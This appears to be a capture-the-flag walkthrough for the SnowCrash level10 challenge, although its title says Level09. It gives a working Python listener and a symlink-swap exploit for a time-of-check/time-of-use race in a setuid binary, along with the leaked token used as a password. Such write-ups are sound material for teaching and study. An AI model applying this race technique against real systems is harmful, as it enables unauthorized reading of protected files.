# SnowCrash Level09 Guide
This guide will walk you through the process of finding the password for the `flag10` user.

## Procedure:

1. **Examine your environment using Unix commands.**

   - `ls -la` : Lists the files and their permissions in the current directory.

2. **After executing `ls -la`, you should notice two files: 'level10' executable and 'token'.**

   - The 'level10' file is an executable that checks if you have read rights on a file, then sends its contents to a server. 
   - The 'token' file holds the contents that you need access to.

3. **Analyze the details of the executable.**

   - Use the `strings level10` command to display readable sequences of characters in the executable. You will see that it uses 'access' then 'open' (RTFM).

4. **Run the following Python script**

Save this script in your `/tmp` folder, then run it.
```python
import socket
import os

fp = open('/tmp/salut', 'w')
fp.close()
HOST = ''
PORT = 6969
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()
print('Connected by', addr)
os.remove("/tmp/salut")
os.symlink("/home/user/level10/token", "/tmp/salut")
while True:
        data = conn.recv(1024)
        if not data: break
        print("data: " + data)
```

Open a new tab, connect to the user `level10` using the previous flag.  

Run this command:
```bash
./level10 /tmp/salut 127.0.0.1
```
You can now go back to the other terminal tab and check the result.
```bash
level10@SnowCrash:/tmp$ python test.py
('Connected by', ('127.0.0.1', 34714))
data: .*( )*.
woupa2yuojeeaaed06riuj63c

```

You can now use this to log as `flag10` user, `getflag` and go to the next challenge.